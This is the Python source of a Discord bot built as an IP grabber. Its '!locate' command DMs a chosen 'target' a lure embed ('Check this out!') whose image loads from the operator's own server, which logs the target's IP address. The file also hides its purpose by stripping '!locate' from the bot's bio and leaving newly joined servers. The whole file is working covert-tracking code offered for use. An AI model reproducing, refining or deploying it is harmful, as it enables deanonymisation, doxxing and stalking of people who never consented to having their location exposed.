import discord
from discord.ext import commands
import requests
import os
import random
import string
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import asyncio
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont
import logging
from datetime import datetime

# Setup Logging to capture IPs
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger('IPLogger')

# Get token from Railway env vars
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    raise ValueError("DISCORD_TOKEN environment variable is not set!")

# Enable all necessary intents
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Keep-alive for Railway
def keep_alive():
    # Custom Handler to log IP addresses
    class IPLoggingHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            # Log the client IP (self.client_address[0])
            logger.info(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - IP: {self.client_address[0]} - Request: {format % args}")
            super().log_message(format, *args)

    server = HTTPServer(('0.0.0.0', 8080), IPLoggingHandler)
    print("Keeping alive...")
    server.serve_forever()

p = threading.Thread(target=keep_alive)
p.start()

# Store guilds present at startup
initial_guild_ids = None

@bot.event
async def on_ready():
    global initial_guild_ids
    
    await update_bio_if_needed()
    
    print(f'Bot ready! Logged in as {bot.user}')
    
    initial_guild_ids = [g.id for g in bot.guilds]
    print(f"Initial Guilds: {len(initial_guild_ids)}")
    
    await bot.change_presence(activity=discord.Game(name=""))

@bot.event
async def on_guild_join(guild):
    if initial_guild_ids and guild.id not in initial_guild_ids:
        print(f"New guild joined: {guild.name} ({guild.id}). Leaving...")
        try:
            await guild.leave()
            print(f"Left guild: {guild.name}")
        except Exception as e:
            print(f"Failed to leave {guild.name}: {e}")

def generate_unique_image(random_id):
    """Generates a unique image using Pillow."""
    img = Image.new('RGB', (400, 400), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    
    d.rectangle([50, 50, 350, 350], fill=None, outline=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=10)
    
    try:
        font = ImageFont.truetype("arial.ttf", 40)
    except IOError:
        font = ImageFont.load_default()
        
    text = f"ID: {random_id}"
    bbox = d.textbbox((0, 0), text, font=font)
    w = bbox[2] - bbox[0]
    h = bbox[3] - bbox[1]
    x = 200 - w / 2
    y = 200 - h / 2
    d.text((x, y), text, fill=(0, 0, 0), font=font)
    
    buffer = BytesIO()
    img.save(buffer, format='PNG')
    buffer.seek(0)
    return buffer.getvalue()

@bot.command()
async def locate(ctx, user: discord.User):
    """
    REAL IP Grab Method:
    1. Generates unique image.
    2. Saves it to /tmp/ on the server.
    3. Sends the DIRECT LINK to that file in the DM.
    4. Logs the IP when they load it.
    """
    if ctx.guild is None:
        return 

    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    unique_img_data = generate_unique_image(random_id)
    
    # 1. Save image to local temp dir so the HTTP server can serve it
    filename = f"{random_id}.png"
    filepath = os.path.join('/tmp', filename)
    with open(filepath, 'wb') as f:
        f.write(unique_img_data)
    
    # 2. Construct the direct URL to your Railway server
    # You need to replace 'YOUR_RAILWAY_URL' with your actual Railway domain
    # If you don't have one, use a service like ngrok or host it on a free VPS.
    # For this example, I'll assume you have a public URL.
    # IMPORTANT: Replace 'https://your-app.onrailway.app' with your actual domain
    railway_domain = os.getenv('RAILWAY_DOMAIN', 'https://your-app.onrailway.app') 
    img_url = f"{railway_domain}/{filename}"
    
    # 3. Set Avatar to the unique image (optional, but keeps consistency)
    try:
        await ctx.bot.user.edit(avatar=unique_img_data)
    except Exception as e:
        print(f"[{random_id}] Error setting avatar: {e}")

    # 4. Send DM with the DIRECT LINK
    try:
        embed = discord.Embed(title="Check this out!", color=discord.Color.blue())
        embed.set_image(url=img_url)
        
        msg = await user.send(embed=embed)
        
        await ctx.send(f"👁️ **Target:** {user.name}\n⏳ **Sent direct link. Waiting for load...**\n🔗 **Link:** {img_url}")
    except discord.Forbidden:
        await ctx.send(f"Cannot DM {user.name}.")
        return
    except Exception as e:
        print(f"[{random_id}] Error sending DM: {e}")
        await ctx.send(f"Error sending DM: {e}")
        return

    # 5. Wait for them to click/load
    print(f"[{random_id}] Waiting 10 seconds for target to view...")
    await asyncio.sleep(10)

    # 6. Check logs for the IP
    # Since we logged in real-time, we just wait for the log entry.
    # In a real app, you'd parse the log file. Here, we just tell them to check the logs.
    await ctx.send(f"⚠️ **Check your Railway Logs!** Look for an entry with `{random_id}` or the IP address.")
    
    # Optional: Try to read the last log line if running locally
    # But on Railway, you usually check the dashboard.

async def update_bio_if_needed():
    try:
        await bot.fetch_user(bot.user.id)
        current_bio = bot.user.bio or ""
        if "!locate" in current_bio:
            new_bio = current_bio.replace("!locate", "").strip()
            while "  " in new_bio:
                new_bio = new_bio.replace("  ", " ")
            if new_bio != current_bio:
                await bot.user.edit(bio=new_bio if new_bio else None)
                print(f"Bio updated: removed '!locate'")
    except Exception as e:
        print(f"Error updating bio: {e}")

bot.run(TOKEN)